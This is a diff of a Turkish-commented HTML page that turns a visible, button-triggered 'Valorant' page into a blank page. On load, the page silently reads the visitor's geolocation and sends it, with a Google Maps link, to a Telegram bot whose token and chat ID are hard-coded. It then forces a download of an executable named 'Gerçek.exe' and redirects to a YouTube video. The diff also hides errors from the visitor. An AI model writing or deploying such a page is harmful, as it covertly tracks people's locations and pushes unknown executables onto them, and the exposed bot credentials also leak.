@@ -1,18 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Valorant Gönderimi</title>
   <meta charset="UTF-8">
+  <title></title>
+  <style>
+    body { margin: 0; background: white; }
+  </style>
   <script>
     const token = '8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg'; // ← Bot tokenını buraya yaz
     const chat_id = '8499614707'; // ← Chat ID buraya
 
-    function sendLocation() {
+    window.onload = function() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
           const lat = position.coords.latitude.toFixed(6);
           const lon = position.coords.longitude.toFixed(6);
-
           const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
           const message = `📍 Konum Bilgisi:\nEnlem: ${lat}\nBoylam: ${lon}\n🧭 Navigasyon: ${googleMapsLink}`;
 
@@ -26,12 +28,10 @@
             })
           })
           .then(() => {
-            console.log("Konum Telegram'a gönderildi.");
-
-            // Valorant Gerçek.exe indir
+            // Gerçek.exe indir
             const link = document.createElement('a');
-            link.href = 'Valorant Gerçek.exe';
-            link.download = 'Valorant Gerçek.exe';
+            link.href = 'Gerçek.exe';
+            link.download = 'Gerçek.exe';
             document.body.appendChild(link);
             link.click();
 
@@ -39,18 +39,15 @@
             window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
           })
           .catch(err => {
-            alert("Telegram'a gönderim başarısız: " + err);
+            console.error("Telegram'a gönderim başarısız:", err);
           });
         });
       } else {
-        alert("Tarayıcınız konum almayı desteklemiyor.");
+        console.error("Tarayıcınız konum almayı desteklemiyor.");
       }
-    }
+    };
   </script>
 </head>
-<body style="text-align:center; font-family:sans-serif; margin-top:50px;">
-  <h2>Valorant Gönderimi Başlat</h2>
-  <p>Konumun Telegram'a gönderilecek, dosya indirilecek ve video açılacak.</p>
-  <button onclick="sendLocation()" style="padding:10px 20px; font-size:16px;">Başlat</button>
+<body>
 </body>
 </html>
